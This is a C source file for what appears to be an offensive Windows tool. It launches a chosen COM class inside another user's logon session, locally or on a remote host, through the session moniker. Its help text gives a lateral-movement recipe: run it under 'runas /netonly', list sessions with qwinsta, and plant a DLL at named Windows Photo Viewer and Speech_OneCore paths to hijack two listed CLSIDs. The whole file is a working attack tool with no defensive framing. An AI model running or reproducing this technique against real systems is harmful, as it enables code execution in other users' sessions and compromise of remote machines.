#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <objbase.h>

#pragma comment(lib, "Shlwapi.lib")

BOOL InstanciateInSession(int iSessId, WCHAR* wszCLSID, WCHAR* wszRemoteHost);
VOID PrintHelp(WCHAR wszProgName[]);

BOOL InstanciateInSession(int iSessId, WCHAR* wszCLSID, WCHAR* wszRemoteHost) {

	BOOL bSTATE = TRUE;
	HRESULT hResult = 0;
	WCHAR wszMoniker[60] = { 0 };
	BIND_OPTS3 sctBindOps3 = { 0 };
	IUnknown* pUnknown = NULL;
	COSERVERINFO sctCoServInfo = { 0 };


	hResult = StringCchPrintfW(wszMoniker, 59, L"session:%d!new:%ws", iSessId, wszCLSID);
	if (FAILED(hResult)) {
		printf("Error in StringCchPrintfW: %ld", hResult);
		bSTATE = FALSE; goto _EndOfFunc;
	}


	sctBindOps3.cbStruct = sizeof(BIND_OPTS3);

	if (wszRemoteHost == NULL) {

		sctBindOps3.dwClassContext = CLSCTX_LOCAL_SERVER;

	}
	else {

		sctCoServInfo.dwReserved1 = 0;
		sctCoServInfo.pwszName = wszRemoteHost;
		sctCoServInfo.pAuthInfo = NULL;
		sctCoServInfo.dwReserved2 = 0;

		sctBindOps3.dwClassContext = CLSCTX_REMOTE_SERVER;
		sctBindOps3.pServerInfo = &sctCoServInfo;

	}

	hResult = CoGetObject(wszMoniker, (LPBIND_OPTS)&sctBindOps3, &IID_IUnknown, &pUnknown);


_EndOfFunc:
	return bSTATE;

}

int wmain(int argc, WCHAR* argv[]) {

	int iSessId = 0;
	WCHAR* wszEndString = NULL;
	WCHAR* wzsCLSID = NULL;
	WCHAR* wzsRemoteHost = NULL;
	HRESULT hResult = 0;

	if (argc < 3) {
		PrintHelp(argv[0]);
		return -1;
	}

	if (!StrToIntExW(argv[1], STIF_DEFAULT, &iSessId)) {
		wprintf(L"Error converting %ws to int\n", argv[1]);
		return -1;
	}

	wzsCLSID = argv[2];


	if (argc > 3) {
		wzsRemoteHost = argv[3];
	}
	else {
		wzsRemoteHost = NULL;
	}

	hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hResult)) {
		printf("Error in CoInitializeEx: %lu", hResult);
		return -1;
	}

	if (!InstanciateInSession(iSessId, wzsCLSID, wzsRemoteHost)) {
		printf("Error instanciating class...");
	}

	CoUninitialize();

	return 0;
}

VOID PrintHelp(WCHAR wszProgName[]) {

	wprintf(L"Usage: %ws <sess_id> <CLSID> [remote_host_if_remote]\n", wszProgName);
	wprintf(L"\n");
	wprintf(L"For remote instanciation:\n");
	wprintf(L"\tLaunch %ws in runas /netonly \n", wszProgName);
	wprintf(L"\tUse either of these commands in runas /netonly to retrieve session IDs:\n");
	wprintf(L"\t\tqwinsta /server:<remote_host>\n");
	wprintf(L"\t\tquery user /server:<remote_host>\n");

	wprintf(L"\n");
	wprintf(L"\n");
	wprintf(L"Usable CLSIDs:\n");
	wprintf(L"\n");
	wprintf(L"\t00F2B433-44E4-4D88-B2B0-2698A0A91DBA (PhotoAcqHWEventHandler)\n");
	wprintf(L"\tPlace DLL at:\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\OLEACC.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\PROPSYS.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\STI.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\WINMM.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\dwmapi.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\UxTheme.dll\n");
	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\VERSION.dll\n");
	wprintf(L"\n");
	wprintf(L"\t03DE7B30-9300-4FA9-AF69-BA09497107A2 (Shared Reco Custom Marshaller COM)\n");
	wprintf(L"\tPlace DLL at:\n");
	wprintf(L"\t\tC:\\Windows\\System32\\Speech_OneCore\\common\\bcp47langs.dll\n");

}